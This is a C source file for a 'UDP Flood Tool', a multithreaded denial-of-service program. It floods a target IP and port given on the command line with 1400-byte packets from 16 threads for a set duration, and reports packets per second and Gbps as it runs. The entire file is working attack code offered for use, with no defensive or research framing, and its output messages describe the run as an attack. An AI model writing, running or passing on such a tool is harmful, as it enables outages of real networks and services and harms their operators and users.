#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define PACKET_SIZE 1400
#define THREAD_COUNT 16
#define BATCH_SIZE 100

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int thread_id;
} thread_data_t;

volatile int running = 1;
volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
time_t start_time;

void signal_handler(int sig) {
    running = 0;
    printf("\nStopping attack...\n");
}

void* stats_thread(void* arg) {
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    time_t last_time = time(NULL);
    
    printf("\n[STATS] Starting monitoring...\n");
    printf("[STATS] Threads: %d | Packet Size: %d\n\n", THREAD_COUNT, PACKET_SIZE);
    
    while (running) {
        sleep(2);
        time_t current_time = time(NULL);
        unsigned long long current_packets = total_packets;
        unsigned long long current_bytes = total_bytes;
        
        double elapsed = difftime(current_time, last_time);
        if (elapsed > 0) {
            double pps = (current_packets - last_packets) / elapsed;
            double mbps = ((current_bytes - last_bytes) * 8.0) / (elapsed * 1000000);
            double gbps = mbps / 1000;
            double total_elapsed = difftime(current_time, start_time);
            
            printf("\r[STATS] Time: %03.0fs | PPS: %.0f | Mbps: %.2f | Gbps: %.3f | Total: %.2f GB", 
                   total_elapsed, pps, mbps, gbps, (double)current_bytes / (1024*1024*1024));
            fflush(stdout);
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    printf("\n");
    return NULL;
}

void* flood_thread(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    
    // Create socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    // Increase send buffer
    int sendbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    
    // Set socket to non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Setup target address
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(data->target_port);
    
    if (inet_pton(AF_INET, data->target_ip, &dest_addr.sin_addr) <= 0) {
        printf("Thread %d: Invalid IP address: %s\n", data->thread_id, data->target_ip);
        close(sock);
        return NULL;
    }
    
    // Create payload
    char payload[PACKET_SIZE];
    memset(payload, 0x41, PACKET_SIZE); // Fill with 'A'
    
    time_t end_time = time(NULL) + data->duration;
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    
    printf("Thread %d started -> %s:%d\n", data->thread_id, data->target_ip, data->target_port);
    
    // Main flood loop
    while (running && time(NULL) < end_time) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            ssize_t sent = sendto(sock, payload, PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            
            if (sent > 0) {
                local_packets++;
                local_bytes += sent;
            }
        }
        
        // Update global counters periodically
        if (local_packets > 1000) {
            __sync_fetch_and_add(&total_packets, local_packets);
            __sync_fetch_and_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    // Final update
    __sync_fetch_and_add(&total_packets, local_packets);
    __sync_fetch_and_add(&total_bytes, local_bytes);
    
    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("UDP Flood Tool\n");
        printf("Usage: %s <IP> <PORT> <DURATION>\n\n", argv[0]);
        printf("Example: %s 192.168.1.100 80 60\n", argv[0]);
        return 1;
    }
    
    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("Starting UDP flood to %s:%d for %d seconds\n", target_ip, target_port, duration);
    printf("Threads: %d, Packet size: %d bytes\n", THREAD_COUNT, PACKET_SIZE);
    
    signal(SIGINT, signal_handler);
    start_time = time(NULL);
    
    pthread_t threads[THREAD_COUNT];
    pthread_t stats_tid;
    thread_data_t thread_data[THREAD_COUNT];
    
    // Start stats thread
    if (pthread_create(&stats_tid, NULL, stats_thread, NULL) != 0) {
        perror("pthread_create stats");
        return 1;
    }
    
    // Start flood threads
    for (int i = 0; i < THREAD_COUNT; i++) {
        strncpy(thread_data[i].target_ip, target_ip, 15);
        thread_data[i].target_ip[15] = '\0';
        thread_data[i].target_port = target_port;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
        
        if (pthread_create(&threads[i], NULL, flood_thread, &thread_data[i]) != 0) {
            perror("pthread_create");
            continue;
        }
    }
    
    printf("All %d threads started. Press Ctrl+C to stop.\n", THREAD_COUNT);
    
    // Wait for all threads to complete
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    running = 0;
    pthread_join(stats_tid, NULL);
    
    double total_seconds = difftime(time(NULL), start_time);
    printf("\nAttack completed!\n");
    printf("Total packets: %llu\n", total_packets);
    printf("Total bytes: %.2f GB\n", (double)total_bytes / (1024*1024*1024));
    printf("Duration: %.1f seconds\n", total_seconds);
    
    if (total_seconds > 0) {
        double avg_gbps = (total_bytes * 8.0) / (total_seconds * 1000000000);
        printf("Average: %.2f Gbps\n", avg_gbps);
    }
    
    return 0;
}
